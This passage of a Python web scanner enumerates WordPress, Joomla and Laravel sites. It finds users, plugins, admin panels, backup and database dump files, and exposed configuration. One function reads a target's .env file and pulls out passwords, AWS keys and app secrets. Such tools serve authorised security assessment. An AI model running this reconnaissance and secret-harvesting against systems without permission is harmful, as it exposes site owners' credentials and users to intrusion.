        print(f"{Colors.CYAN}  │  └─ Total Plugins Found: {Colors.GREEN}{len(plugins)}{Colors.RESET}")
        return list(set(plugins)), raw_data

    @staticmethod
    def theme_enum(source, url, ua):
        themes = []; raw_data = {}
        print(f"{Colors.CYAN}  ├─ Theme Enumeration Methods:{Colors.RESET}")
        print(f"{Colors.CYAN}  │  ├─ Source Code Analysis...{Colors.RESET}")
        raw_data['source_code'] = []
        try:
            patterns = [
                (r'wp-content/themes/([^/]+)/', 'standard'),
                (r'src=".*?wp-content/themes/([^/]+)/', 'src_attr'),
                (r'href=".*?wp-content/themes/([^/]+)/', 'href_attr'),
                (r'themes/([^/]+)/', 'simple')
            ]
            found_themes = []
            for pattern, source_type in patterns:
                m = re.findall(pattern, source)
                for t in m:
                    if t not in ['', '../', '..', ' ', '?'] and t not in found_themes:
                        if t not in ['wp-admin', 'wp-includes', 'wp-content', 'plugins', 'themes', 'uploads']:
                            ver_match = re.search(r'wp-content/themes/' + re.escape(t) + r'/.+ver=([0-9.]+)', source)
                            version = ver_match.group(1) if ver_match else 'unknown'
                            theme_entry = f"{t}:{version}"
                            if theme_entry not in themes:
                                themes.append(theme_entry); found_themes.append(t)
                                raw_data['source_code'].append({'theme': t, 'version': version, 'source': source_type})
                                print(f"{Colors.GREEN}  │  │  └─ Found: {t} v{version} (from source code){Colors.RESET}")
        except Exception as e:
            raw_data['source_code'] = {'error': str(e)}
            print(f"{Colors.YELLOW}  │  │  └─ Source Code: Error occurred{Colors.RESET}")
        
        print(f"{Colors.CYAN}  │  ├─ Directory Listing...{Colors.RESET}")
        raw_data['directory_listing'] = []
        try:
            r, s = make_request(url + 'wp-content/themes/', ua=ua, timeout=15)
            if s and r and r.status_code == 200:
                raw_data['directory_listing'].append({'url': url + 'wp-content/themes/', 'status': r.status_code})
                if 'Index of' in r.text:
                    m = re.findall(r'href="([^"]+)/"', r.text)
                    for t in m:
                        if t not in ['', '../', '..', '?'] and t not in ['wp-admin', 'wp-includes', 'wp-content', 'plugins', 'themes', 'uploads']:
                            theme_entry = f"{t}:unknown"
                            if theme_entry not in themes:
                                themes.append(theme_entry)
                                raw_data['directory_listing'].append({'theme': t, 'source': 'directory_listing'})
                                print(f"{Colors.GREEN}  │  │  └─ Found: {t} (directory listing){Colors.RESET}")
        except Exception as e:
            raw_data['directory_listing'] = {'error': str(e)}
            print(f"{Colors.YELLOW}  │  │  └─ Directory Listing: Error occurred{Colors.RESET}")
        
        print(f"{Colors.CYAN}  │  ├─ Style.css...{Colors.RESET}")
        raw_data['style_css'] = []
        try:
            theme_names = [t.split(':')[0] for t in themes[:30]]
            for name in theme_names:
                style_url = url + f'wp-content/themes/{name}/style.css'
                r, s = make_request(style_url, ua=ua, timeout=15)
                if s and r and r.status_code == 200:
                    raw_data['style_css'].append({'theme': name, 'url': style_url, 'status': r.status_code})
                    ver_match = re.search(r'Version:\s*([0-9.]+)', r.text)
                    if ver_match:
                        new_theme = f"{name}:{ver_match.group(1)}"
                        if new_theme not in themes:
                            for i, th in enumerate(themes):
                                if th.split(':')[0] == name:
                                    themes[i] = new_theme
                                    break
                            else:
                                themes.append(new_theme)
                            raw_data['style_css'].append({'theme': name, 'version': ver_match.group(1), 'source': 'style_css'})
                            print(f"{Colors.GREEN}  │  │  └─ {name} version: {ver_match.group(1)} (from style.css){Colors.RESET}")
        except Exception as e:
            raw_data['style_css'] = {'error': str(e)}
            print(f"{Colors.YELLOW}  │  │  └─ Style.css: Error occurred{Colors.RESET}")
        
        print(f"{Colors.CYAN}  │  ├─ Screenshot...{Colors.RESET}")
        raw_data['screenshot'] = []
        try:
            theme_names = [t.split(':')[0] for t in themes[:30]]
            for name in theme_names:
                screenshot_url = url + f'wp-content/themes/{name}/screenshot.png'
                r, s = make_request(screenshot_url, ua=ua, timeout=10)
                if s and r and r.status_code == 200:
                    raw_data['screenshot'].append({'theme': name, 'url': screenshot_url, 'status': r.status_code})
                    print(f"{Colors.GREEN}  │  │  └─ {name} screenshot found{Colors.RESET}")
        except Exception as e:
            raw_data['screenshot'] = {'error': str(e)}
        
        raw_data['total_themes'] = len(themes)
        print(f"{Colors.CYAN}  │  └─ Total Themes Found: {Colors.GREEN}{len(themes)}{Colors.RESET}")
        return list(set(themes)), raw_data

    @staticmethod
    def check_registration(url, ua):
        r_url = url + 'wp-login.php?action=register'
        r, s = make_request(r_url, ua=ua, timeout=20)
        if s and r and r.status_code == 200:
            if 'Registration confirmation' in r.text or 'value="Register"' in r.text:
                return True, r_url
        return False, ""

    @staticmethod
    def path_disclosure(url, ua):
        paths = ['/wp-includes/rss.php', '/wp-content/themes/twentyfifteen/index.php']
        for p in paths:
            r, s = make_request(url + p, ua=ua, timeout=20)
            if s and r and 'on line' in r.text:
                m = re.search(r'<b>/(.*?)' + re.escape(p) + r'</b>', r.text)
                if m: return m.group(1)
        return ""

    @staticmethod
    def check_xmlrpc(url, ua):
        r, s = make_request(url + 'xmlrpc.php', ua=ua, timeout=20)
        if s and r and r.status_code == 405: return True
        return False

    @staticmethod
    def check_rest_api(url, ua):
        r, s = make_request(url + 'wp-json/wp/v2/posts', ua=ua, timeout=20)
        if s and r and r.status_code == 200: return True
        return False

    @staticmethod
    def run(url, ua, source):
        results = {}
        print(f"\n{Colors.BOLD}{Colors.CYAN}┌{'─'*56}┐{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.CYAN}│{' '*15}WORDPRESS DEEP SCAN RESULTS{' '*16}│{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.CYAN}└{'─'*56}┘{Colors.RESET}\n")
        
        print(f"{Colors.CYAN}┌{'─'*56}┐{Colors.RESET}")
        print(f"{Colors.CYAN}│ USER ENUMERATION{' '*38}│{Colors.RESET}")
        print(f"{Colors.CYAN}├{'─'*56}┤{Colors.RESET}")
        users, user_raw = WPDeepScan.user_enum(url, ua)
        results['users'] = users; results['user_raw_data'] = user_raw
        print(f"{Colors.CYAN}├{'─'*56}┤{Colors.RESET}")
        print(f"{Colors.CYAN}│ {Colors.GREEN}Total Users Found: {len(users)}{Colors.CYAN}{' '*(33-len(str(len(users))))}│{Colors.RESET}")
        print(f"{Colors.CYAN}└{'─'*56}┘{Colors.RESET}\n")
        
        print(f"{Colors.CYAN}┌{'─'*56}┐{Colors.RESET}")
        print(f"{Colors.CYAN}│ PLUGIN ENUMERATION{' '*36}│{Colors.RESET}")
        print(f"{Colors.CYAN}├{'─'*56}┤{Colors.RESET}")
        plugins, plugin_raw = WPDeepScan.plugin_enum(source, url, ua)
        results['plugins'] = plugins; results['plugin_raw_data'] = plugin_raw
        print(f"{Colors.CYAN}├{'─'*56}┤{Colors.RESET}")
        print(f"{Colors.CYAN}│ {Colors.GREEN}Total Plugins Found: {len(plugins)}{Colors.CYAN}{' '*(31-len(str(len(plugins))))}│{Colors.RESET}")
        print(f"{Colors.CYAN}└{'─'*56}┘{Colors.RESET}\n")
        
        print(f"{Colors.CYAN}┌{'─'*56}┐{Colors.RESET}")
        print(f"{Colors.CYAN}│ THEME ENUMERATION{' '*37}│{Colors.RESET}")
        print(f"{Colors.CYAN}├{'─'*56}┤{Colors.RESET}")
        themes, theme_raw = WPDeepScan.theme_enum(source, url, ua)
        results['themes'] = themes; results['theme_raw_data'] = theme_raw
        print(f"{Colors.CYAN}├{'─'*56}┤{Colors.RESET}")
        print(f"{Colors.CYAN}│ {Colors.GREEN}Total Themes Found: {len(themes)}{Colors.CYAN}{' '*(32-len(str(len(themes))))}│{Colors.RESET}")
        print(f"{Colors.CYAN}└{'─'*56}┘{Colors.RESET}\n")
        
        print(f"{Colors.CYAN}┌{'─'*56}┐{Colors.RESET}")
        print(f"{Colors.CYAN}│ REGISTRATION STATUS{' '*35}│{Colors.RESET}")
        print(f"{Colors.CYAN}├{'─'*56}┤{Colors.RESET}")
        results['registration'] = WPDeepScan.check_registration(url, ua)
        status = "Open" if results['registration'][0] else "Closed"
        status_color = Colors.GREEN if status == "Open" else Colors.YELLOW
        print(f"{Colors.CYAN}│ {status_color}Status: {status}{Colors.CYAN}{' '*(40-len(status))}│{Colors.RESET}")
        print(f"{Colors.CYAN}└{'─'*56}┘{Colors.RESET}\n")
        
        print(f"{Colors.CYAN}┌{'─'*56}┐{Colors.RESET}")
        print(f"{Colors.CYAN}│ PATH DISCLOSURE{' '*37}│{Colors.RESET}")
        print(f"{Colors.CYAN}├{'─'*56}┤{Colors.RESET}")
        results['path'] = WPDeepScan.path_disclosure(url, ua)
        if results['path']:
            print(f"{Colors.CYAN}│ {Colors.GREEN}Path: {results['path']}{Colors.CYAN}{' '*(43-len(results['path']))}│{Colors.RESET}")
        else:
            print(f"{Colors.CYAN}│ {Colors.YELLOW}None found{' '*40}│{Colors.RESET}")
        print(f"{Colors.CYAN}└{'─'*56}┘{Colors.RESET}\n")
        
        print(f"{Colors.CYAN}┌{'─'*56}┐{Colors.RESET}")
        print(f"{Colors.CYAN}│ XML-RPC STATUS{' '*38}│{Colors.RESET}")
        print(f"{Colors.CYAN}├{'─'*56}┤{Colors.RESET}")
        results['xmlrpc'] = WPDeepScan.check_xmlrpc(url, ua)
        status = "Enabled" if results['xmlrpc'] else "Disabled"
        status_color = Colors.GREEN if status == "Enabled" else Colors.YELLOW
        print(f"{Colors.CYAN}│ {status_color}XML-RPC: {status}{Colors.CYAN}{' '*(40-len(status))}│{Colors.RESET}")
        print(f"{Colors.CYAN}└{'─'*56}┘{Colors.RESET}\n")
        
        print(f"{Colors.CYAN}┌{'─'*56}┐{Colors.RESET}")
        print(f"{Colors.CYAN}│ REST API STATUS{' '*37}│{Colors.RESET}")
        print(f"{Colors.CYAN}├{'─'*56}┤{Colors.RESET}")
        results['rest_api'] = WPDeepScan.check_rest_api(url, ua)
        status = "Enabled" if results['rest_api'] else "Disabled"
        status_color = Colors.GREEN if status == "Enabled" else Colors.YELLOW
        print(f"{Colors.CYAN}│ {status_color}REST API: {status}{Colors.CYAN}{' '*(40-len(status))}│{Colors.RESET}")
        print(f"{Colors.CYAN}└{'─'*56}┘{Colors.RESET}\n")
        
        print(f"\n{Colors.BOLD}{Colors.GREEN}┌{'─'*56}┐{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.GREEN}│{' '*17}DEEP SCAN SUMMARY{' '*21}│{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.GREEN}├{'─'*56}┤{Colors.RESET}")
        print(f"{Colors.GREEN}│ {Colors.CYAN}Users Found:    {Colors.GREEN}{len(results['users'])}{Colors.GREEN}{' '*(33-len(str(len(results['users']))))}│{Colors.RESET}")
        print(f"{Colors.GREEN}│ {Colors.CYAN}Plugins Found:  {Colors.GREEN}{len(results['plugins'])}{Colors.GREEN}{' '*(31-len(str(len(results['plugins']))))}│{Colors.RESET}")
        print(f"{Colors.GREEN}│ {Colors.CYAN}Themes Found:   {Colors.GREEN}{len(results['themes'])}{Colors.GREEN}{' '*(32-len(str(len(results['themes']))))}│{Colors.RESET}")
        print(f"{Colors.GREEN}│ {Colors.CYAN}Registration:   {Colors.GREEN}{'Open' if results['registration'][0] else 'Closed'}{Colors.GREEN}{' '*(33-len('Open' if results['registration'][0] else 'Closed'))}│{Colors.RESET}")
        print(f"{Colors.GREEN}│ {Colors.CYAN}XML-RPC:        {Colors.GREEN}{'Enabled' if results['xmlrpc'] else 'Disabled'}{Colors.GREEN}{' '*(34-len('Enabled' if results['xmlrpc'] else 'Disabled'))}│{Colors.RESET}")
        print(f"{Colors.GREEN}│ {Colors.CYAN}REST API:       {Colors.GREEN}{'Enabled' if results['rest_api'] else 'Disabled'}{Colors.GREEN}{' '*(34-len('Enabled' if results['rest_api'] else 'Disabled'))}│{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.GREEN}└{'─'*56}┘{Colors.RESET}\n")
        
        if results['users']:
            print(f"{Colors.YELLOW}Users found:{Colors.RESET}")
            for u in results['users']: print(f"  {Colors.GREEN}→ {u}{Colors.RESET}")
        if results['plugins']:
            print(f"{Colors.YELLOW}Plugins found:{Colors.RESET}")
            for p in results['plugins'][:10]: 
                if ':' in p:
                    name, ver = p.split(':', 1)
                    print(f"  {Colors.GREEN}→ {name} v{ver}{Colors.RESET}")
                else:
                    print(f"  {Colors.GREEN}→ {p}{Colors.RESET}")
        if results['themes']:
            print(f"{Colors.YELLOW}Themes found:{Colors.RESET}")
            for t in results['themes'][:5]: 
                if ':' in t:
                    name, ver = t.split(':', 1)
                    print(f"  {Colors.GREEN}→ {name} v{ver}{Colors.RESET}")
                else:
                    print(f"  {Colors.GREEN}→ {t}{Colors.RESET}")
        print()
        return results

class JoomlaDeepScan:
    @staticmethod
    def admin_finder(url, ua):
        admins = ['administrator', 'admin', 'panel', 'webadmin', 'manage']
        found = []
        for a in admins:
            r, s = make_request(url + a, ua=ua, timeout=20)
            if s and r and r.status_code == 200: found.append(a)
        return found

    @staticmethod
    def backup_check(url, ua):
        backups = ['backup.zip', 'joomla.zip', 'configuration.php.bak']
        found = []
        for b in backups:
            r, s = make_request(url + b, ua=ua, timeout=20)
            if s and r and r.status_code == 200: found.append(b)
        return found

    @staticmethod
    def config_check(url, ua):
        configs = ['configuration.php~', 'configuration.php.bak', 'configuration.php.old']
        found = []
        for c in configs:
            r, s = make_request(url + c, ua=ua, timeout=20)
            if s and r and r.status_code == 200: found.append(c)
        return found

    @staticmethod
    def debug_check(source):
        if 'Joomla! Debug Console' in source or 'xdebug' in source:
            return True
        return False

    @staticmethod
    def reg_check(url, ua):
        r_url = url + 'index.php?option=com_users&view=registration'
        r, s = make_request(r_url, ua=ua, timeout=20)
        if s and r and r.status_code == 200:
            if 'registration.register' in r.text or 'jform_password2' in r.text:
                return True, r_url
        return False, ""

    @staticmethod
    def run(url, ua, source):
        results = {}
        results['admins'] = JoomlaDeepScan.admin_finder(url, ua)
        results['backups'] = JoomlaDeepScan.backup_check(url, ua)
        results['configs'] = JoomlaDeepScan.config_check(url, ua)
        results['debug'] = JoomlaDeepScan.debug_check(source)
        results['registration'] = JoomlaDeepScan.reg_check(url, ua)
        return results

class LaravelDeepScan:
    @staticmethod
    def run(url, ua, source):
        results = {}
        print(f"{Colors.CYAN}  ├─ Laravel Intelligence Scan:{Colors.RESET}")
        results['version'] = LaravelDeepScan.detect_version(url, ua, source)
        results['env'] = LaravelDeepScan.detect_environment(url, ua)
        results['debug_mode'] = LaravelDeepScan.check_debug_mode(url, ua, source)
        results['config_exposure'] = LaravelDeepScan.check_config_exposure(url, ua)
        results['env_file_exposure'] = LaravelDeepScan.check_env_exposure(url, ua)
        results['directories'] = LaravelDeepScan.enumerate_directories(url, ua)
        results['packages'] = LaravelDeepScan.enumerate_packages(url, ua)
        results['api_endpoints'] = LaravelDeepScan.enumerate_api_endpoints(url, ua)
        results['admin_paths'] = LaravelDeepScan.find_admin_paths(url, ua)
        results['session_config'] = LaravelDeepScan.check_session_config(url, ua)
        results['security_headers'] = LaravelDeepScan.check_security_headers(url, ua)
        results['db_exposure'] = LaravelDeepScan.check_db_exposure(url, ua)
        results['horizon_exposure'] = LaravelDeepScan.check_horizon(url, ua)
        results['telescope_exposure'] = LaravelDeepScan.check_telescope(url, ua)
        results['nova_exposure'] = LaravelDeepScan.check_nova(url, ua)
        results['broadcasting'] = LaravelDeepScan.check_broadcasting(url, ua)
        results['cache_exposure'] = LaravelDeepScan.check_cache_exposure(url, ua)
        results['upload_paths'] = LaravelDeepScan.find_upload_paths(url, ua)
        results['backup_files'] = LaravelDeepScan.find_backup_files(url, ua)
        results['users'] = LaravelDeepScan.enumerate_users(url, ua)
        results['sanctum'] = LaravelDeepScan.check_sanctum(url, ua)
        results['passport'] = LaravelDeepScan.check_passport(url, ua)
        print(f"{Colors.CYAN}  │  └─ Laravel scan complete{Colors.RESET}")
        return results
    
    @staticmethod
    def detect_version(url, ua, source):
        r, s = make_request(url + 'package.json', ua=ua, timeout=20)
        if s and r and r.status_code == 200:
            try:
                data = r.json()
                if 'devDependencies' in data:
                    for pkg, ver in data['devDependencies'].items():
                        if 'laravel' in pkg.lower():
                            match = re.search(r'(\d+\.\d+\.\d+)', ver)
                            if match:
                                print(f"{Colors.GREEN}  │  │  └─ Version: {match.group(1)}{Colors.RESET}")
                                return match.group(1)
            except: pass
        patterns = [r'Laravel\s+v?(\d+\.\d+\.\d+)', r'<meta name="generator" content="Laravel v?(\d+\.\d+\.\d+)"', r'X-Laravel-Version:\s*(\d+\.\d+\.\d+)']
        for pattern in patterns:
            match = re.search(pattern, source, re.I)
            if match:
                print(f"{Colors.GREEN}  │  │  └─ Version: {match.group(1)}{Colors.RESET}")
                return match.group(1)
        r, s = make_request(url, ua=ua, timeout=20)
        if s and r and 'X-Laravel-Version' in r.headers:
            print(f"{Colors.GREEN}  │  │  └─ Version: {r.headers['X-Laravel-Version']}{Colors.RESET}")
            return r.headers['X-Laravel-Version']
        print(f"{Colors.YELLOW}  │  │  └─ Version: unknown{Colors.RESET}")
        return "unknown"
    
    @staticmethod
    def detect_environment(url, ua):
        r, s = make_request(url, ua=ua, timeout=20)
        if s and r:
            debug_indicators = ['debug', 'whoops', 'xdebug', 'display_errors', 'error_reporting']
            body = r.text.lower()[:5000] if r.text else ""
            for ind in debug_indicators:
                if ind in body:
                    print(f"{Colors.YELLOW}  │  │  └─ Environment: Development (debug enabled){Colors.RESET}")
                    return 'development'
        r, s = make_request(url + '.env', ua=ua, timeout=20)
        if s and r and r.status_code == 200:
            env_match = re.search(r'APP_ENV[\s=]+([^\s]+)', r.text)
            if env_match:
                env = env_match.group(1)
                print(f"{Colors.GREEN}  │  │  └─ Environment: {env}{Colors.RESET}")
                return env
        print(f"{Colors.CYAN}  │  │  └─ Environment: production (assumed){Colors.RESET}")
        return 'production'
    
    @staticmethod
    def check_debug_mode(url, ua, source):
        debug_patterns = [r'APP_DEBUG[\s=]+true', r'debug[\s:]+true', r'Whoops\\Handler', r'<th>Exception</th>', r'<h1>Whoops!</h1>']
        for pattern in debug_patterns:
            if re.search(pattern, source, re.I):
                print(f"{Colors.RED}  │  │  └─ Debug Mode: ENABLED{Colors.RESET}")
                return True
        r, s = make_request(url + '/_debugbar/', ua=ua, timeout=20)
        if s and r and r.status_code == 200:
            print(f"{Colors.RED}  │  │  └─ Debug Mode: ENABLED (DebugBar){Colors.RESET}")
            return True
        print(f"{Colors.GREEN}  │  │  └─ Debug Mode: Disabled{Colors.RESET}")
        return False
    
    @staticmethod
    def check_config_exposure(url, ua):
        exposed = []
        config_files = ['config/app.php', 'config/database.php', 'config/cache.php', 'config/session.php', 
                       'config/filesystems.php', 'config/services.php', 'config/auth.php', 'config/broadcasting.php',
                       'config/hashing.php', 'config/logging.php', 'config/mail.php', 'config/queue.php']
        for cfg in config_files:
            r, s = make_request(url + cfg, ua=ua, timeout=20)
            if s and r and r.status_code == 200:
                exposed.append(cfg)
                print(f"{Colors.YELLOW}  │  │  └─ Config exposed: {cfg}{Colors.RESET}")
        return exposed
    
    @staticmethod
    def check_env_exposure(url, ua):
        r, s = make_request(url + '.env', ua=ua, timeout=20)
        if s and r and r.status_code == 200:
            env_content = r.text
            sensitive_keys = ['APP_KEY', 'APP_SECRET', 'DB_PASSWORD', 'DB_USERNAME', 'MAIL_PASSWORD', 
                            'MAIL_USERNAME', 'REDIS_PASSWORD', 'AWS_SECRET_ACCESS_KEY', 'AWS_ACCESS_KEY_ID',
                            'PUSHER_APP_SECRET', 'JWT_SECRET']
            found = {}
            for key in sensitive_keys:
                match = re.search(r'^' + key + r'\s*=\s*(.+)$', env_content, re.M)
                if match: found[key] = match.group(1).strip()
            if found:
                print(f"{Colors.RED}  │  │  └─ CRITICAL: .env exposed with secrets:{Colors.RESET}")
                for k, v in list(found.items())[:5]:
                    print(f"{Colors.RED}  │  │     └─ {k} = {v[:20]}...{Colors.RESET}")
                return found
            else:
                print(f"{Colors.YELLOW}  │  │  └─ .env accessible{Colors.RESET}")
                return {'accessible': True}
        return {}
    
    @staticmethod
    def enumerate_directories(url, ua):
        directories = []
        dirs = ['app/', 'app/Http/', 'app/Models/', 'config/', 'database/', 'database/migrations/',
               'resources/', 'resources/views/', 'routes/', 'storage/', 'storage/app/', 'storage/framework/',
               'tests/', 'public/', 'public/storage/', 'vendor/', 'bootstrap/', 'bootstrap/cache/']
        for d in dirs:
            r, s = make_request(url + d, ua=ua, timeout=15)
            if s and r and r.status_code == 200:
                directories.append(d)
                if 'Index of' in r.text:
                    print(f"{Colors.YELLOW}  │  │  └─ Directory listing: {d}{Colors.RESET}")
        return directories
    
    @staticmethod
    def enumerate_packages(url, ua):
        packages = {}
        r, s = make_request(url + 'composer.json', ua=ua, timeout=20)
        if s and r and r.status_code == 200:
            try:
                data = r.json()
                if 'require' in data:
                    for pkg, ver in data['require'].items():
                        packages[pkg] = ver
                        notable = {'laravel/horizon': 'Queue monitoring', 'laravel/telescope': 'Debug assistant',
                                 'laravel/nova': 'Admin panel', 'laravel/sanctum': 'API auth',
                                 'laravel/passport': 'OAuth2', 'spatie/laravel-permission': 'ACL',
                                 'barryvdh/laravel-debugbar': 'Debug bar'}
                        for notable_pkg, desc in notable.items():
                            if notable_pkg in pkg:
                                print(f"{Colors.CYAN}  │  │  └─ Package: {pkg} ({desc}){Colors.RESET}")
                return packages
            except: pass
        return {}
    
    @staticmethod
    def enumerate_api_endpoints(url, ua):
        endpoints = []
        api_routes = ['api/', 'api/v1/', 'api/v2/', 'api/health', 'api/status', 'api/ping',
                     'api/users', 'api/login', 'api/register', 'api/posts', 'api/comments', 'api/products',
                     'api/orders', 'api/payments', 'api/cart', 'api/categories', 'api/tags', 'api/search']
        for route in api_routes:
            r, s = make_request(url + route, ua=ua, timeout=15)
            if s and r and r.status_code in [200, 201, 202, 204, 400, 401, 403, 405]:
                endpoints.append(route)
                status_color = Colors.GREEN if r.status_code < 400 else Colors.YELLOW
                print(f"{status_color}  │  │  └─ API: {route} ({r.status_code}){Colors.RESET}")
        return endpoints
    
    @staticmethod
    def find_admin_paths(url, ua):
        admin_paths = []
        admin_urls = ['admin/', 'admin/login', 'admin/dashboard', 'cp/', 'cp/login', 'cp/dashboard',
                     'dashboard/', 'dashboard/login', 'backend/', 'backend/login',
                     'nova/', 'nova/login', 'nova/dashboard', 'horizon/', 'horizon/dashboard',
                     'telescope/', 'telescope/dashboard']
        for admin in admin_urls:
            r, s = make_request(url + admin, ua=ua, timeout=15)
            if s and r and r.status_code in [200, 401, 403]:
                admin_paths.append(admin)
                status = "accessible" if r.status_code == 200 else "protected"
                print(f"{Colors.YELLOW}  │  │  └─ Admin: {admin} ({status}){Colors.RESET}")
                if 'login' in r.text.lower() or 'password' in r.text.lower():
                    print(f"{Colors.CYAN}  │  │     └─ Login form detected{Colors.RESET}")
        return admin_paths
    
    @staticmethod
    def check_session_config(url, ua):
        session_info = {}
        r, s = make_request(url, ua=ua, timeout=20)
        if s and r:
            for cookie in r.cookies:
                if 'laravel_session' in cookie.name:
                    session_info['laravel_session'] = True
                    print(f"{Colors.CYAN}  │  │  └─ Session cookie: {cookie.name}{Colors.RESET}")
        return session_info
    
    @staticmethod
    def check_security_headers(url, ua):
        required_headers = ['X-Frame-Options', 'X-Content-Type-Options', 'X-XSS-Protection',
                           'Content-Security-Policy', 'Strict-Transport-Security', 'Referrer-Policy']
        r, s = make_request(url, ua=ua, timeout=20)
        if s and r:
            present = [h for h in required_headers if h in r.headers]
            missing = [h for h in required_headers if h not in r.headers]
            if missing:
                print(f"{Colors.YELLOW}  │  │  └─ Missing security headers: {', '.join(missing[:3])}{Colors.RESET}")
            if 'X-Laravel-Version' in r.headers:
                print(f"{Colors.YELLOW}  │  │  └─ WARNING: X-Laravel-Version header exposes version{Colors.RESET}")
        return {}
    
    @staticmethod
    def check_db_exposure(url, ua):
        exposed = []
        db_files = ['database.sql', 'db.sql', 'dump.sql', 'backup.sql', 'database.sqlite']
        for dbf in db_files:
            r, s = make_request(url + dbf, ua=ua, timeout=15)
            if s and r and r.status_code == 200:
                exposed.append(dbf)
                if 'CREATE TABLE' in r.text or 'INSERT INTO' in r.text:
                    print(f"{Colors.RED}  │  │  └─ CRITICAL: Database dump: {dbf}{Colors.RESET}")
                else:
                    print(f"{Colors.YELLOW}  │  │  └─ Database file: {dbf}{Colors.RESET}")
        return exposed
    
    @staticmethod
    def check_horizon(url, ua):
        for path in ['horizon/', 'horizon/dashboard']:
            r, s = make_request(url + path, ua=ua, timeout=15)
            if s and r and r.status_code == 200:
                print(f"{Colors.YELLOW}  │  │  └─ Horizon exposed (queue monitoring){Colors.RESET}")
                return True
        return False
    
    @staticmethod
    def check_telescope(url, ua):
        for path in ['telescope/', 'telescope/requests']:
            r, s = make_request(url + path, ua=ua, timeout=15)
            if s and r and r.status_code == 200:
                print(f"{Colors.YELLOW}  │  │  └─ Telescope exposed (debug assistant){Colors.RESET}")
                return True
        return False
    
    @staticmethod
    def check_nova(url, ua):
        for path in ['nova/', 'nova/login']:
            r, s = make_request(url + path, ua=ua, timeout=15)
            if s and r and r.status_code == 200:
                print(f"{Colors.YELLOW}  │  │  └─ Nova exposed (admin panel){Colors.RESET}")
                return True
        return False
    
    @staticmethod
    def check_broadcasting(url, ua):
        r, s = make_request(url + '/broadcasting/auth', ua=ua, timeout=15)
        if s and r and r.status_code in [200, 401, 403]:
            print(f"{Colors.CYAN}  │  │  └─ Broadcasting auth endpoint{Colors.RESET}")
            return True
        return False
    
    @staticmethod
    def check_cache_exposure(url, ua):
        cache_paths = ['storage/framework/cache/', 'storage/framework/views/', 'bootstrap/cache/']
        exposed = []
        for path in cache_paths:
            r, s = make_request(url + path, ua=ua, timeout=15)
            if s and r and r.status_code == 200 and 'Index of' in r.text:
                exposed.append(path)
                print(f"{Colors.YELLOW}  │  │  └─ Cache directory listing: {path}{Colors.RESET}")
        return exposed
    
    @staticmethod
    def find_upload_paths(url, ua):
        upload_paths = ['uploads/', 'storage/uploads/', 'storage/app/public/', 'public/uploads/']
        found = []
        for path in upload_paths:
            r, s = make_request(url + path, ua=ua, timeout=15)
            if s and r and r.status_code == 200:
                found.append(path)
                if 'Index of' in r.text:
                    print(f"{Colors.YELLOW}  │  │  └─ Upload directory listing: {path}{Colors.RESET}")
        return found
    
    @staticmethod
    def find_backup_files(url, ua):
        found = []
        backup_files = ['backup.zip', 'backup.tar.gz', 'dump.sql', 'db_backup.zip', '.env.backup', '.env.old']
        for bf in backup_files:
            r, s = make_request(url + bf, ua=ua, timeout=15)
            if s and r and r.status_code == 200:
                found.append(bf)
                print(f"{Colors.YELLOW}  │  │  └─ Backup file: {bf}{Colors.RESET}")
        return found
    
    @staticmethod
    def enumerate_users(url, ua):
        users = []
        api_endpoints = ['api/users', 'api/v1/users', 'api/v2/users', 'api/user']
        for endpoint in api_endpoints:
            r, s = make_request(url + endpoint, ua=ua, timeout=15)
            if s and r and r.status_code == 200:
                try:
                    data = r.json()
                    if isinstance(data, list):
                        for user in data:
                            if isinstance(user, dict):
                                username = user.get('name') or user.get('username') or user.get('email')
                                if username and username not in users:
                                    users.append(username)
                except: pass
        if users:
            print(f"{Colors.GREEN}  │  │  └─ Users found: {', '.join(users[:5])}{Colors.RESET}")
        return users
    
    @staticmethod
    def check_sanctum(url, ua):
        r, s = make_request(url + 'sanctum/csrf-cookie', ua=ua, timeout=15)
        if s and r and r.status_code in [200, 204]:
            print(f"{Colors.CYAN}  │  │  └─ Sanctum CSRF endpoint{Colors.RESET}")
            return True
        return False
    
    @staticmethod
    def check_passport(url, ua):
        for endpoint in ['oauth/authorize', 'oauth/token']:
            r, s = make_request(url + endpoint, ua=ua, timeout=15)
            if s and r and r.status_code in [200, 401, 403, 405]:
                print(f"{Colors.CYAN}  │  │  └─ Passport endpoint: {endpoint}{Colors.RESET}")
                return True
        return False

class SecurityChecker:
    def __init__(self, url, cid, cname, version):
        self.url = url; self.cid = cid; self.cname = cname; self.version = version
        self.vulns = []; self.ua = get_ua()
        self.scores = {'critical':0, 'high':0, 'medium':0, 'low':0}

    def add_vuln(self, name, desc, severity, poc="", rem=""):
        vuln = {'name': name, 'description': desc, 'severity': severity.upper(),
                'cms': self.cname, 'version': self.version, 'poc': poc, 'remediation': rem,
                'timestamp': datetime.now().isoformat()}
        self.vulns.append(vuln)
        self.scores[severity.lower()] += 1
        color = {'critical': Colors.RED+Colors.BOLD, 'high': Colors.RED, 'medium': Colors.YELLOW, 'low': Colors.BLUE}.get(severity.lower(), Colors.WHITE)
        print(f"{color}[!] {severity.upper()} - {name}{Colors.RESET}")
        print(f"    {desc}")
        if poc: print(f"    PoC: {poc}")
        if rem: print(f"    Remediation: {rem}")
        print()

    def check_all(self):
        self.check_dir_listing(); self.check_sensitive_files(); self.check_admin_panel()
        self.check_debug_mode(); self.check_lfi(); self.check_sqli(); self.check_xss()
        self.check_bruteforce(); self.check_cves(); self.check_headers()
        self.check_common(); self.check_cms_specific()
        return {'vulnerabilities':self.vulns, 'summary':self.get_summary()}

    def get_summary(self):
        return {'total': len(self.vulns), 'critical': self.scores['critical'],
                'high': self.scores['high'], 'medium': self.scores['medium'],
                'low': self.scores['low'], 'risk': self.calc_risk()}

    def calc_risk(self):
        if self.scores['critical'] > 0: return 'CRITICAL'
        if self.scores['high'] > 2: return 'HIGH'
        if self.scores['high'] > 0 or self.scores['medium'] > 3: return 'MEDIUM'
        if self.scores['medium'] > 0: return 'LOW'
        return 'INFO'

    def check_dir_listing(self):
        dirs = ['wp-content/uploads/', 'images/', 'assets/', 'uploads/']
        for d in dirs:
            r, s = make_request(self.url + d, ua=self.ua, timeout=20)
            if s and r and r.status_code == 200 and ('Index of' in r.text or 'Directory listing' in r.text):
